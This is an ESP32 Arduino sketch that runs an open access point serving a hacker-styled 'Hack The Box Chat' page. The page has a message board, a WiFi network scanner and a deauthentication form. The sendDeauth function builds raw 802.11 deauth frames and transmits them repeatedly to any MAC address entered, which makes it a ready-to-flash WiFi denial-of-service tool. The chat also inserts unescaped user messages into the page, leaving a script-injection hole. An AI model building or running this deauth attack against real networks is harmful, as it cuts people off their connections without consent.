#include <WiFi.h>
#include <WebServer.h>
#include "esp_wifi.h"
#include "esp_now.h"

const char* ssid = "techiesms";
const char* password = "";

WebServer server(80);
String messages = "";
String wifiScanResults = "";

const char webpage[] PROGMEM = R"=====(<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Hack The Box Chat</title>
  <style>
    body {
      font-family: 'Courier New', monospace;
      background-color: #0f0f0f;
      color: #00ff00;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background-color: #1a1a1a;
      padding: 20px;
      border: 1px solid #00ff00;
      border-radius: 10px;
      box-shadow: 0 0 20px #00ff00;
      width: 90%;
      max-width: 600px;
      text-align: center;
    }

    h1, h3 {
      color: #00ff00;
      text-shadow: 0 0 5px #00ff00;
    }

    input[type="text"], input[type="submit"] {
      width: 80%;
      padding: 10px;
      margin: 10px 0;
      background-color: #0f0f0f;
      color: #00ff00;
      border: 1px solid #00ff00;
      border-radius: 5px;
      font-size: 16px;
    }

    input[type="submit"]:hover {
      background-color: #00ff00;
      color: #0f0f0f;
      box-shadow: 0 0 15px #00ff00;
    }

    #messages {
      margin-top: 20px;
      text-align: left;
      max-height: 200px;
      overflow-y: auto;
      border-top: 1px solid #00ff00;
      padding-top: 10px;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Hack The Box Chat</h1>
    <h3>Enter your message:</h3>
    <form action="/send" method="POST">
      <input type="text" name="message" placeholder="Type something...">
      <input type="submit" value="Send">
    </form>
    <form action="/scan_wifi" method="GET">
      <input type="submit" value="Scan WiFi">
    </form>
    <form action="/deauth" method="POST">
      <input type="text" name="target" placeholder="Target MAC (AA:BB:CC:DD:EE:FF)">
      <input type="submit" value="Deauth">
    </form>
    <div id="messages"></div>
  </div>
  <script>
    async function fetchMessages() {
      const response = await fetch('/messages');
      const messages = await response.text();
      document.getElementById('messages').innerHTML = messages;
    }
    setInterval(fetchMessages, 1000);
  </script>
</body>
</html>
)=====";

void handleRoot() {
  char buffer[sizeof(webpage)];
  strcpy_P(buffer, webpage);
  String page = buffer;
  page.replace("<div id=\"messages\"></div>", "<div id=\"messages\">" + messages + "<br><br><strong>WiFi Scan Results:</strong><br>" + wifiScanResults + "</div>");
  server.send(200, "text/html", page);
}

void handleSend() {
  if (server.hasArg("message")) {
    String message = server.arg("message");
    if (message == "reset") {
      messages = "";
    } else {
      messages += "Web: " + message + "<br>";
    }
    Serial.println("Received message from web: " + message);
  }
  server.sendHeader("Location", "/");
  server.send(303);
}

void handleMessages() {
  server.send(200, "text/html", messages + "<br><br><strong>WiFi Scan Results:</strong><br>" + wifiScanResults);
}

void handleScanWifi() {
  int n = WiFi.scanNetworks();
  wifiScanResults = "";

  if (n == 0) {
    wifiScanResults = "No networks found.<br>";
  } else {
    for (int i = 0; i < n; ++i) {
      wifiScanResults += String(i + 1) + ". ";
      wifiScanResults += WiFi.SSID(i);
      wifiScanResults += " (RSSI: ";
      wifiScanResults += WiFi.RSSI(i);
      wifiScanResults += ") ";
      wifiScanResults += WiFi.BSSIDstr(i);
      wifiScanResults += "<br>";
    }
  }
  WiFi.scanDelete();
  Serial.println("WiFi Scan Completed");
  server.sendHeader("Location", "/");
  server.send(303);
}

void sendDeauth(const String& macStr) {
  uint8_t mac[6];
  if (sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
             &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) != 6) {
    Serial.println("Invalid MAC address format");
    return;
  }

  const uint8_t deauthPacket[] = {
    0xc0, 0x00, 0x3a, 0x01, 
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
    0x00, 0x00
  };

  for (int i = 0; i < 20; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
    delay(10);
  }

  messages += "Deauth sent to " + macStr + "<br>";
  Serial.println("Deauth packets sent to: " + macStr);
}

void handleDeauth() {
  if (server.hasArg("target")) {
    String mac = server.arg("target");
    sendDeauth(mac);
  }
  server.sendHeader("Location", "/");
  server.send(303);
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid, password);
  esp_wifi_set_promiscuous(true);

  Serial.println("AP IP address: " + WiFi.softAPIP().toString());

  server.on("/", handleRoot);
  server.on("/send", HTTP_POST, handleSend);
  server.on("/messages", handleMessages);
  server.on("/scan_wifi", handleScanWifi);
  server.on("/deauth", HTTP_POST, handleDeauth);

  server.begin();
  Serial.println("Server started");
}

void loop() {
  server.handleClient();
}
